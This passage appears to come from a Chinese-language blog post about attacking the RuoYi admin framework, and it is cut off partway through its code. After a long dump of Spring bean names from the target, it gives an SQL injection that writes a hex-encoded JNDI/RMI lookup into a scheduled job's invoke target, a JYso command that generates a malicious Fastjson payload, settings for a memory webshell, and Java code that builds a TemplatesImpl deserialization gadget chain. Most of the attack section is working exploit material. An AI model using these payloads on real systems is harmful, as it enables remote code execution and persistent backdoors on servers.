class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.LifecycleProperties&quot;</span><br> <span class="hljs-string">&quot;modelNamesRegistryFactoryPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;demoDialogController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.demo.controller.DemoDialogController&quot;</span><br> <span class="hljs-string">&quot;sysRoleMenuMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy284&quot;</span><br> <span class="hljs-string">&quot;defaultModelSpecificationProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.DefaultModelSpecificationProvider&quot;</span><br> <span class="hljs-string">&quot;scheduledExecutorService&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.common.config.thread.ThreadPoolConfig$1&quot;</span><br> <span class="hljs-string">&quot;pagehelper-com.github.pagehelper.autoconfigure.PageHelperProperties&quot;</span> -&gt; <span class="hljs-string">&quot;com.github.pagehelper.autoconfigure.PageHelperProperties&quot;</span><br> <span class="hljs-string">&quot;java8TimeDialect&quot;</span> -&gt; <span class="hljs-string">&quot;org.thymeleaf.extras.java8time.dialect.Java8TimeDialect&quot;</span><br> <span class="hljs-string">&quot;org.springframework.transaction.config.internalTransactionAdvisor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.transaction.interceptor.BeanFactoryTransactionAttributeSourceAdvisor&quot;</span><br> <span class="hljs-string">&quot;sysConfigController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysConfigController$$EnhancerBySpringCGLIB$$23ad098d&quot;</span><br> <span class="hljs-string">&quot;parameterNamesModule&quot;</span> -&gt; <span class="hljs-string">&quot;com.fasterxml.jackson.module.paramnames.ParameterNamesModule&quot;</span><br> <span class="hljs-string">&quot;myBatisConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.MyBatisConfig$$EnhancerBySpringCGLIB$$afd6e26c&quot;</span><br> <span class="hljs-string">&quot;examplesMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.mappers.ExamplesMapperImpl&quot;</span><br> <span class="hljs-string">&quot;operationAuthReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OperationAuthReader&quot;</span><br> <span class="hljs-string">&quot;authorizationAttributeSourceAdvisor&quot;</span> -&gt; <span class="hljs-string">&quot;org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor&quot;</span><br> <span class="hljs-string">&quot;operationImplicitParametersReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OperationImplicitParametersReader&quot;</span><br> <span class="hljs-string">&quot;webMvcSwaggerTransformationFilterRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;sysPostMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy290&quot;</span><br> <span class="hljs-string">&quot;securityMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.SecurityMapperImpl&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;apiModelBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.schema.ApiModelBuilder&quot;</span><br> <span class="hljs-string">&quot;pathProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.paths.DefaultPathProvider&quot;</span><br> <span class="hljs-string">&quot;genTableColumnMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy305&quot;</span><br> <span class="hljs-string">&quot;permissionsAspect&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.aspectj.PermissionsAspect&quot;</span><br> <span class="hljs-string">&quot;sysDeptMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy293&quot;</span><br> <span class="hljs-string">&quot;restTemplateBuilderConfigurer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.client.RestTemplateBuilderConfigurer&quot;</span><br> <span class="hljs-string">&quot;filterConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.FilterConfig$$EnhancerBySpringCGLIB$$a602d8eb&quot;</span><br> <span class="hljs-string">&quot;parameterTypeReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.parameter.ParameterTypeReader&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;springfox.documentation-springfox.boot.starter.autoconfigure.SpringfoxConfigurationProperties&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.boot.starter.autoconfigure.SpringfoxConfigurationProperties&quot;</span><br> <span class="hljs-string">&quot;swaggerOperationResponseClassReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.SwaggerOperationResponseClassReader&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration$TomcatWebSocketConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration$TomcatWebSocketConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;sessionManager&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.web.session.OnlineWebSessionManager&quot;</span><br> <span class="hljs-string">&quot;xmlPropertyPlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.property.XmlPropertyPlugin&quot;</span><br> <span class="hljs-string">&quot;spring.task.execution-org.springframework.boot.autoconfigure.task.TaskExecutionProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.task.TaskExecutionProperties&quot;</span><br> <span class="hljs-string">&quot;viewControllerHandlerMapping&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.handler.SimpleUrlHandlerMapping&quot;</span><br> <span class="hljs-string">&quot;typeNameProviderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;themeResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.theme.FixedThemeResolver&quot;</span><br> <span class="hljs-string">&quot;mvcPatternParser&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.util.pattern.PathPatternParser&quot;</span><br> <span class="hljs-string">&quot;isNullPlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.schema.IsNullAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.sql.init.dependency.DatabaseInitializationDependencyConfigurer$DependsOnDatabaseInitializationPostProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.sql.init.dependency.DatabaseInitializationDependencyConfigurer$DependsOnDatabaseInitializationPostProcessor&quot;</span><br> <span class="hljs-string">&quot;dispatcherServlet&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet&quot;</span><br> <span class="hljs-string">&quot;classPathRestartStrategy&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.classpath.PatternClassPathRestartStrategy&quot;</span><br> <span class="hljs-string">&quot;dictUtils&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.common.utils.DictUtils&quot;</span><br> <span class="hljs-string">&quot;springfox.documentation.swagger2.configuration.Swagger2WebMvcConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.configuration.Swagger2WebMvcConfiguration$$EnhancerBySpringCGLIB$$6a2d385e&quot;</span><br> <span class="hljs-string">&quot;apiDescriptionReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.ApiDescriptionReader&quot;</span><br> <span class="hljs-string">&quot;swaggerOperationModelsProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.SwaggerOperationModelsProvider&quot;</span><br> <span class="hljs-string">&quot;resourcesConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.ResourcesConfig$$EnhancerBySpringCGLIB$$90e7a4de&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;spring.devtools-org.springframework.boot.devtools.autoconfigure.DevToolsProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.DevToolsProperties&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.context.properties.ConfigurationPropertiesBindingPostProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.context.properties.ConfigurationPropertiesBindingPostProcessor&quot;</span><br> <span class="hljs-string">&quot;pagehelper-com.github.pagehelper.autoconfigure.PageHelperStandardProperties&quot;</span> -&gt; <span class="hljs-string">&quot;com.github.pagehelper.autoconfigure.PageHelperStandardProperties&quot;</span><br> <span class="hljs-string">&quot;sysRoleMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy286&quot;</span><br> <span class="hljs-string">&quot;apiResourceController&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.web.ApiResourceController&quot;</span><br> <span class="hljs-string">&quot;spring.jdbc-org.springframework.boot.autoconfigure.jdbc.JdbcProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.JdbcProperties&quot;</span><br> <span class="hljs-string">&quot;cachingOperationReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.CachingOperationReader&quot;</span><br> <span class="hljs-string">&quot;swaggerResponseMessageReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.SwaggerResponseMessageReader&quot;</span><br> <span class="hljs-string">&quot;transactionAttributeSource&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.transaction.annotation.AnnotationTransactionAttributeSource&quot;</span><br> <span class="hljs-string">&quot;defaultModelDependencyProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.DefaultModelDependencyProvider&quot;</span><br> <span class="hljs-string">&quot;dict&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.web.service.DictService&quot;</span><br> <span class="hljs-string">&quot;transactionManager&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.jdbc.support.JdbcTransactionManager&quot;</span><br> <span class="hljs-string">&quot;errorPageCustomizer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$ErrorPageCustomizer&quot;</span><br> <span class="hljs-string">&quot;apiOperationReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.ApiOperationReader&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$DefaultErrorViewResolverConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$DefaultErrorViewResolverConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysRegisterController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysRegisterController&quot;</span><br> <span class="hljs-string">&quot;tomcatWebServerFactoryCustomizer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.embedded.TomcatWebServerFactoryCustomizer&quot;</span><br> <span class="hljs-string">&quot;sysDictDataServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysDictDataServiceImpl&quot;</span><br> <span class="hljs-string">&quot;operationModelsProviderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;openApiModule&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.configuration.OpenApiJacksonModule&quot;</span><br> <span class="hljs-string">&quot;viewNameTranslator&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysJobLogMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy303&quot;</span><br> <span class="hljs-string">&quot;mediaTypeReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.MediaTypeReader&quot;</span><br> <span class="hljs-string">&quot;operationResponseClassReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.OperationResponseClassReader&quot;</span><br> <span class="hljs-string">&quot;swagger2ControllerWebMvc&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.web.Swagger2ControllerWebMvc&quot;</span><br> <span class="hljs-string">&quot;cachingOperationNameGenerator&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.CachingOperationNameGenerator&quot;</span><br> <span class="hljs-string">&quot;demoOperateController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.demo.controller.DemoOperateController&quot;</span><br> <span class="hljs-string">&quot;dispatcherServletRegistration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.DispatcherServletRegistrationBean&quot;</span><br> <span class="hljs-string">&quot;sysMenuMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy283&quot;</span><br> <span class="hljs-string">&quot;expanderPattern&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.ExpandedParameterPatternAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;sysMenuServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysMenuServiceImpl&quot;</span><br> <span class="hljs-string">&quot;serverController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.monitor.ServerController$$EnhancerBySpringCGLIB$$fe7bf21f&quot;</span><br> <span class="hljs-string">&quot;operationParameterHeadersConditionReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.OperationParameterHeadersConditionReader&quot;</span><br> <span class="hljs-string">&quot;descriptionResolver&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.DescriptionResolver&quot;</span><br> <span class="hljs-string">&quot;tomcatServletWebServerFactory&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersConfiguration$MappingJackson2HttpMessageConverterConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersConfiguration$MappingJackson2HttpMessageConverterConfiguration&quot;</span><br> <span class="hljs-string">&quot;liveReloadServerEventListener&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.LocalDevToolsAutoConfiguration$LiveReloadServerEventListener&quot;</span><br> <span class="hljs-string">&quot;spring.jackson-org.springframework.boot.autoconfigure.jackson.JacksonProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonProperties&quot;</span><br> <span class="hljs-string">&quot;operationParameterRequestConditionReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.OperationParameterRequestConditionReader&quot;</span><br> <span class="hljs-string">&quot;error&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$StaticView&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$JacksonObjectMapperConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$JacksonObjectMapperConfiguration&quot;</span><br> <span class="hljs-string">&quot;operationNotesReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OperationNotesReader&quot;</span><br> <span class="hljs-string">&quot;webMvcOpenApiTransformer&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.web.WebMvcBasePathAndHostnameTransformationFilter&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$WhitelabelErrorViewConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$WhitelabelErrorViewConfiguration&quot;</span><br> <span class="hljs-string">&quot;decimalMinMaxPlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.schema.DecimalMinMaxAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration$DispatcherServletConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration$DispatcherServletConfiguration&quot;</span><br> <span class="hljs-string">&quot;cachingModelDependencyProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.CachingModelDependencyProvider&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration$TransactionTemplateConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration$TransactionTemplateConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysNoticeController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysNoticeController$$EnhancerBySpringCGLIB$$cbdbf78f&quot;</span><br> <span class="hljs-string">&quot;defaultValidator&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.validation.beanvalidation.LocalValidatorFactoryBean&quot;</span><br> <span class="hljs-string">&quot;welcomePageHandlerMapping&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.WelcomePageHandlerMapping&quot;</span><br> <span class="hljs-string">&quot;sysLogininforServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysLogininforServiceImpl&quot;</span><br> <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.stat.DruidFilterConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.stat.DruidFilterConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.mybatis.spring.boot.autoconfigure.MybatisAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.mybatis.spring.boot.autoconfigure.MybatisAutoConfiguration$$EnhancerBySpringCGLIB$$8caaf85f&quot;</span><br> <span class="hljs-string">&quot;jacksonObjectMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.fasterxml.jackson.databind.ObjectMapper&quot;</span><br> <span class="hljs-string">&quot;shiroConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.ShiroConfig$$EnhancerBySpringCGLIB$$3871d2aa&quot;</span><br> <span class="hljs-string">&quot;apiDocumentationScanner&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.ApiDocumentationScanner&quot;</span><br> <span class="hljs-string">&quot;parameterDefaultReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.parameter.ParameterDefaultReader&quot;</span><br> <span class="hljs-string">&quot;schemaMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.mappers.SchemaMapperImpl&quot;</span><br> <span class="hljs-string">&quot;modelSpecificationFactory&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.property.ModelSpecificationFactory&quot;</span><br> <span class="hljs-string">&quot;sqlSessionTemplate&quot;</span> -&gt; <span class="hljs-string">&quot;org.mybatis.spring.SqlSessionTemplate&quot;</span><br></code></pre></td></tr></table></figure><p>看js得到版本</p><p>以后碰见若依用这个就行了 ，若果不行就是&gt;4.7.8</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e6c6461702e496e697469616c4c646170436f6e746578742e6c6f6f6b75702827726d693a2f2f3132372e302e302e313a313039372f6578702729 WHERE job_id = 1;&#x27;</span>)<br></code></pre></td></tr></table></figure><p> hex改成你的jdni地址的hex就行了 </p><p>高版本jdk直接用 我的工具起一个恶意ldap去hook一下返回流就行了</p><p><img src="image-20241027002808213.png" alt="image-20241027002808213"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">生成恶意bin<br>java -jar JYso-1.3.4-all.jar -y -g Fastjson1 -p &quot;open .&quot; -f fj.bn<br></code></pre></td></tr></table></figure><p>内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//加密器: JAVA_AES_BASE64</span><br><span class="hljs-comment">//密码: Azlvjmc</span><br><span class="hljs-comment">//密钥: Fbwgkux</span><br><span class="hljs-comment">//请求路径: /*</span><br><span class="hljs-comment">//请求头: Referer: Kpziyci</span><br><span class="hljs-comment">//脚本类型: JSP</span><br><span class="hljs-comment">//http://127.0.0.1:8088/favicon.ico</span><br><br><span class="hljs-keyword">package</span> com.ruoyi;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> org.apache.ibatis.javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.ibatis.javassist.CtClass;<br><br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fj</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(<span class="hljs-string">&quot;&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;decode&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        objects.add(templates);<br><br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bad</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(bad,<span class="hljs-string">&quot;val&quot;</span>,objects);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates,bad);<br><br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./fj.bin&quot;</span>));<br>        outputStream.writeObject(hashMap);<br>        outputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./fj.bin&quot;</span>));<br>        inputStream.readObject();<br>    